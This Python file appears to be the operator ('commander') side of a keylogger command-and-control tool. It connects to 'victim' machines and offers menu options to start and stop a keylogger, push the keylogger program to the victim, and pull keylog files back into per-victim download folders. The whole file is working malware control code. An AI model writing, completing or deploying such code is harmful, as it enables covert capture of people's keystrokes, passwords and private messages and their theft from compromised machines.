import os
import select
from commander_utils import *

if __name__ == '__main__':
    # Initialization + GetOpts
    source_ip, source_port, destination_ip, destination_port = parse_arguments()

    # Initialize server socket and socket lists
    server_socket = initialize_server_socket(source_ip, source_port)

    # List of sockets to monitor for readability (includes the server and stdin FDs)
    sockets_to_read = [server_socket, sys.stdin]

    # Initialize client list to keep track of connected client sockets and their addresses (IP, Port)
    # Key/Value Pair => [Socket] : (IP, Port)
    connected_clients = {}

    # Initial connect to victim as passed by argument (and put in sockets_to_read)
    print_config(destination_ip, destination_port, (source_ip, source_port))
    victim_socket = initial_connect_to_client(sockets_to_read, connected_clients, destination_ip,
                                              destination_port)

    # Display Menu
    display_menu()

    while True:
        # Use select to monitor multiple sockets
        readable, _, _ = select.select(sockets_to_read, [], [])

        # Display menu & prompt user selection
        command = get_menu_selection()

        for sock in readable:
            # a) Handle new connections
            if sock is server_socket:
                # This means there is a new incoming connection
                process_new_connections(server_socket, sockets_to_read, connected_clients)

            # b) Read from stdin file descriptor (Initiate Menu from keystroke)
            elif sock is sys.stdin:
                # MENU ITEM 1 - Start Keylogger
                if command == constants.PERFORM_MENU_ITEM_ONE:
                    perform_menu_item_1(connected_clients)

                # MENU ITEM 2 - Stop Keylogger
                if command == constants.PERFORM_MENU_ITEM_TWO:
                    perform_menu_item_2(connected_clients)

                # MENU ITEM 3 - Transfer keylog program to victim
                if command == constants.PERFORM_MENU_ITEM_THREE:
                    perform_menu_item_3(connected_clients)

                # MENU ITEM 4 - Get Keylog File from Victim
                if command == constants.PERFORM_MENU_ITEM_FOUR:
                    # Check if client list is empty
                    if len(connected_clients) == constants.ZERO:
                        print(constants.GET_KEYLOG_FILE_NO_CLIENTS_ERROR)

                    # Handle single client in client list
                    if len(connected_clients) == constants.CLIENT_LIST_INITIAL_SIZE:
                        client_socket, (client_ip, client_port, status) = next(iter(connected_clients.items()))

                        # Check if currently keylogging
                        if status:
                            print(constants.GET_KEYLOG_FILE_KEYLOG_TRUE_ERROR.format(client_ip, client_port))
                            print(constants.KEYLOG_STATUS_TRUE_ERROR_SUGGEST)
                            print(constants.RETURN_MAIN_MENU_MSG)
                            print(constants.MENU_CLOSING_BANNER)
                        else:
                            # Send to victim a notification that it is wanting to receive keylog files
                            print(constants.SEND_GET_KEYLOG_SIGNAL_PROMPT)
                            client_socket.send(constants.TRANSFER_KEYLOG_FILE_SIGNAL.encode())

                            # Await response if there are any .txt files to transfer
                            print(constants.GET_KEYLOG_PROCESS_MSG.format(client_ip, client_port))
                            response = client_socket.recv(constants.BYTE_LIMIT).decode().split('/')
                            response_status = response[0]
                            response_msg = response[1]
                            print(constants.CLIENT_RESPONSE.format(response_msg))

                            # If present, then create directory (eg: downloads/127.0.0.1) and start file transfer
                            if response_status == constants.STATUS_TRUE:
                                main_directory = constants.DOWNLOADS_DIR
                                sub_directory = str(client_ip)

                                # Create the main directory (if it doesn't exist)
                                if not os.path.exists(main_directory):
                                    print(constants.CREATE_DOWNLOAD_DIRECTORY_PROMPT.format(main_directory))
                                    os.mkdir(main_directory)
                                    print(constants.DIRECTORY_SUCCESS_MSG)

                                # Create the subdirectory within the main directory
                                sub_directory_path = os.path.join(main_directory, sub_directory)

                                if not os.path.exists(sub_directory_path):
                                    print(constants.CREATE_DOWNLOAD_DIRECTORY_PROMPT.format(sub_directory_path))
                                    os.mkdir(sub_directory_path)
                                    print(constants.DIRECTORY_SUCCESS_MSG)

                                    # Send ACK response
                                    client_socket.send("OK".encode())

                                    # Get number of files from client/victim for iteration length
                                    number_of_files = client_socket.recv(constants.MIN_BUFFER_SIZE).decode()

                                    # Send ACK
                                    client_socket.send("OK".encode())

                                    # ADD files from client to commander
                                    for i in range(int(number_of_files)):
                                        file_name = client_socket.recv(1024).decode()
                                        print(constants.RECEIVING_FILE_MSG.format(file_name))

                                        file_path = os.path.join(sub_directory_path, file_name)

                                        with open(file_path, constants.WRITE_BINARY_MODE) as file:
                                            while True:
                                                data = client_socket.recv(1024)
                                                if not data:
                                                    break
                                                if data.endswith(constants.END_OF_FILE_SIGNAL):
                                                    data = data[:-len(constants.END_OF_FILE_SIGNAL)]
                                                    file.write(data)
                                                    break
                                                file.write(data)

                                        # Send ACK to commander (if good)
                                        if is_file_openable(file_path):
                                            print(constants.TRANSFER_SUCCESS_MSG.format(file_name))
                                            client_socket.send(constants.VICTIM_ACK.encode())
                                        else:
                                            client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())
                                else:
                                    print(f"[+] DIRECTORY ALREADY EXISTS: {sub_directory_path} already exists!")

                                    # Send ACK response
                                    client_socket.send("OK".encode())

                                    # Get number of files from client/victim for iteration length
                                    number_of_files = client_socket.recv(constants.MIN_BUFFER_SIZE).decode()

                                    # Send ACK
                                    client_socket.send("OK".encode())

                                    # ADD files from client to commander
                                    for i in range(int(number_of_files)):
                                        file_name = client_socket.recv(1024).decode()
                                        print(constants.RECEIVING_FILE_MSG.format(file_name))

                                        file_path = os.path.join(sub_directory_path, file_name)

                                        with open(file_path, constants.WRITE_BINARY_MODE) as file:
                                            while True:
                                                data = client_socket.recv(1024)
                                                if not data:
                                                    break
                                                if data.endswith(constants.END_OF_FILE_SIGNAL):
                                                    data = data[:-len(constants.END_OF_FILE_SIGNAL)]
                                                    file.write(data)
                                                    break
                                                file.write(data)

                                        # Send ACK to commander (if good)
                                        if is_file_openable(file_path):
                                            print(constants.TRANSFER_SUCCESS_MSG.format(file_name))
                                            client_socket.send(constants.VICTIM_ACK.encode())
                                        else:
                                            client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())

                # MENU ITEM 5 - Disconnect from victim
                if command == constants.PERFORM_MENU_ITEM_FIVE:
                    disconnect_from_client(sockets_to_read, connected_clients)

                # MENU ITEM 12 - Connect to a specific victim
                if command == constants.PERFORM_MENU_ITEM_TWELVE:
                    _, target_socket, target_ip, target_port = connect_to_client_with_prompt(sockets_to_read,
                                                                                             connected_clients)

            #  c) If not server or stdin sockets, then handle data coming from clients
            else:
                # Data is available to read from an existing client connection
                data = sock.recv(constants.BYTE_LIMIT)
                if not data:
                    print("[+] Connection closed by", connected_clients[sock])
                    del connected_clients[sock]
                    sockets_to_read.remove(sock)
                else:
                    print("[+] Received from", connected_clients[sock], ":", data.decode())

                    # Broadcast the received message to all other connected clients
                    for client_sock in connected_clients:
                        if client_sock != sock:
                            try:
                                client_sock.send(data)
                            except Exception as e:
                                print("[+] Error broadcasting to", connected_clients[client_sock], ":", str(e))
